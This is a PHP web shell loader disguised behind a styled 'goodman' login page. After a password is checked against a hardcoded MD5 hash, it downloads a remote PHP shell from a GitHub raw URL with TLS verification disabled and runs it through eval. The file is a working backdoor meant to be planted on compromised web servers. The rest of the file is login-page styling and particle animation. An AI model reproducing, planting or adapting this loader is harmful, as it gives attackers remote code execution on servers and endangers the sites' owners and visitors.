<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['goodman'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['goodman']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '650fdfed95f57fd164169befa6a14357'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['goodman'] = 'goodman'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        $error_message = "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/abyp.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>goodman</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
                color: #fff;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
                position: relative;
                overflow-x: hidden;
            }

            .background-animation {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
                opacity: 0.3;
            }

            .particle {
                position: absolute;
                background-color: rgba(255, 50, 50, 0.7);
                border-radius: 50%;
                animation: float 15s infinite linear;
            }

            @keyframes float {
                0% {
                    transform: translateY(0) translateX(0) rotate(0deg);
                    opacity: 0.7;
                }
                50% {
                    transform: translateY(-100px) translateX(100px) rotate(180deg);
                    opacity: 0.3;
                }
                100% {
                    transform: translateY(0) translateX(0) rotate(360deg);
                    opacity: 0.7;
                }
            }

            .login-container {
                background: rgba(10, 10, 20, 0.85);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 450px;
                box-shadow: 0 15px 35px rgba(255, 0, 0, 0.2);
                border: 1px solid rgba(255, 50, 50, 0.3);
                position: relative;
                overflow: hidden;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
            }

            .login-container:hover {
                transform: translateY(-5px);
                box-shadow: 0 20px 40px rgba(255, 0, 0, 0.3);
            }

            .login-container::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 5px;
                background: linear-gradient(90deg, #ff0000, #ff3333, #ff6666);
            }

            .logo-container {
                text-align: center;
                margin-bottom: 30px;
            }

            .logo {
                font-size: 2.5rem;
                font-weight: 800;
                background: linear-gradient(90deg, #ff0000, #ff6666, #ff0000);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 1px;
                margin-bottom: 10px;
            }

            .logo-subtitle {
                color: #aaa;
                font-size: 0.9rem;
                letter-spacing: 2px;
                text-transform: uppercase;
            }

            .ascii-art {
                font-family: monospace;
                font-size: 8px;
                line-height: 1;
                text-align: center;
                color: #ff3333;
                margin: 20px 0;
                filter: brightness(1.2);
                user-select: none;
            }

            .welcome-text {
                text-align: center;
                margin-bottom: 30px;
                font-size: 1.2rem;
                color: #eee;
            }

            .welcome-text span {
                color: #ff4444;
                font-weight: bold;
            }

            .login-form {
                display: flex;
                flex-direction: column;
                gap: 25px;
            }

            .input-group {
                position: relative;
            }

            .input-group label {
                position: absolute;
                top: 50%;
                left: 15px;
                transform: translateY(-50%);
                color: #aaa;
                transition: all 0.3s ease;
                pointer-events: none;
                display: flex;
                align-items: center;
                gap: 8px;
            }

            .input-group input {
                width: 100%;
                padding: 15px 15px 15px 50px;
                background: rgba(30, 30, 40, 0.8);
                border: 2px solid rgba(255, 50, 50, 0.3);
                border-radius: 10px;
                color: #fff;
                font-size: 1rem;
                transition: all 0.3s ease;
            }

            .input-group input:focus {
                outline: none;
                border-color: #ff3333;
                box-shadow: 0 0 0 2px rgba(255, 50, 50, 0.2);
            }

            .input-group input:focus + label,
            .input-group input:not(:placeholder-shown) + label {
                top: 0;
                left: 10px;
                font-size: 0.8rem;
                background: rgba(10, 10, 20, 0.9);
                padding: 0 5px;
                color: #ff4444;
            }

            .input-group input::placeholder {
                color: transparent;
            }

            .login-button {
                background: linear-gradient(90deg, #ff0000, #ff3333);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 10px;
                font-size: 1.1rem;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                letter-spacing: 1px;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10px;
                margin-top: 10px;
            }

            .login-button:hover {
                background: linear-gradient(90deg, #cc0000, #ff2222);
                transform: translateY(-2px);
                box-shadow: 0 7px 15px rgba(255, 0, 0, 0.3);
            }

            .login-button:active {
                transform: translateY(0);
            }

            .security-notice {
                text-align: center;
                margin-top: 20px;
                font-size: 0.85rem;
                color: #888;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }

            .error-message {
                background: rgba(255, 50, 50, 0.1);
                border-left: 4px solid #ff3333;
                padding: 12px 15px;
                border-radius: 5px;
                color: #ff6666;
                font-size: 0.9rem;
                display: <?php echo isset($error_message) ? 'block' : 'none'; ?>;
                animation: fadeIn 0.3s ease;
            }

            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-10px); }
                to { opacity: 1; transform: translateY(0); }
            }

            .footer {
                text-align: center;
                margin-top: 30px;
                font-size: 0.8rem;
                color: #666;
                border-top: 1px solid rgba(255, 50, 50, 0.1);
                padding-top: 20px;
            }

            .pulse {
                display: inline-block;
                width: 10px;
                height: 10px;
                background-color: #ff3333;
                border-radius: 50%;
                margin-right: 8px;
                animation: pulse 2s infinite;
            }

            @keyframes pulse {
                0% { box-shadow: 0 0 0 0 rgba(255, 50, 50, 0.7); }
                70% { box-shadow: 0 0 0 10px rgba(255, 50, 50, 0); }
                100% { box-shadow: 0 0 0 0 rgba(255, 50, 50, 0); }
            }

            @media (max-width: 600px) {
                .login-container {
                    padding: 30px 20px;
                }
                
                .logo {
                    font-size: 2rem;
                }
                
                .ascii-art {
                    font-size: 6px;
                }
            }
        </style>
    </head>
    <body>
        <div class="background-animation" id="particles"></div>
        
        <div class="login-container">
            <div class="logo-container">
                <div class="logo">goodman</div>
                <div class="logo-subtitle">goodman</div>
            </div>
            
            <div class="ascii-art">
                ⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
                ⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
                ⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
                ⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
                ⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
                ⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
                ⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
                ⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
                ⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
                ⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
                ⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
                ⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
                ⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
                ⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
            </div>
            
            <div class="welcome-text">
                Welcome, <span>YAMEEEEE SENPAIIII</span>
            </div>
            
            <?php if (isset($error_message)): ?>
                <div class="error-message">
                    <i class="fas fa-exclamation-circle"></i> <?php echo $error_message; ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="" class="login-form">
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password">
                        <i class="fas fa-key"></i> Access Key
                    </label>
                </div>
                
                <button type="submit" class="login-button">
                    <i class="fas fa-lock"></i> open goodman
                </button>
            </form>
            
            <div class="security-notice">
                <div class="pulse"></div>
                <span>Secure authentication required</span>
            </div>
            
            <div class="footer">
                <i class="fas fa-shield-alt"></i> Protected by goodman.
            </div>
        </div>

        <script>
            // Create background particles
            document.addEventListener('DOMContentLoaded', function() {
                const particlesContainer = document.getElementById('particles');
                const particleCount = 30;
                
                for (let i = 0; i < particleCount; i++) {
                    const particle = document.createElement('div');
                    particle.classList.add('particle');
                    
                    // Random size and position
                    const size = Math.random() * 10 + 5;
                    particle.style.width = `${size}px`;
                    particle.style.height = `${size}px`;
                    particle.style.left = `${Math.random() * 100}%`;
                    particle.style.top = `${Math.random() * 100}%`;
                    
                    // Random color with red theme
                    const red = Math.floor(Math.random() * 100 + 155);
                    const opacity = Math.random() * 0.5 + 0.3;
                    particle.style.backgroundColor = `rgba(${red}, 50, 50, ${opacity})`;
                    
                    // Random animation duration and delay
                    const duration = Math.random() * 20 + 10;
                    const delay = Math.random() * 5;
                    particle.style.animationDuration = `${duration}s`;
                    particle.style.animationDelay = `${delay}s`;
                    
                    particlesContainer.appendChild(particle);
                }
                
                // Add focus effect to password input
                const passwordInput = document.getElementById('password');
                passwordInput.addEventListener('focus', function() {
                    this.parentElement.classList.add('focused');
                });
                
                passwordInput.addEventListener('blur', function() {
                    if (this.value === '') {
                        this.parentElement.classList.remove('focused');
                    }
                });
            });
        </script>
    </body>
    </html>
    <?php
}
?>
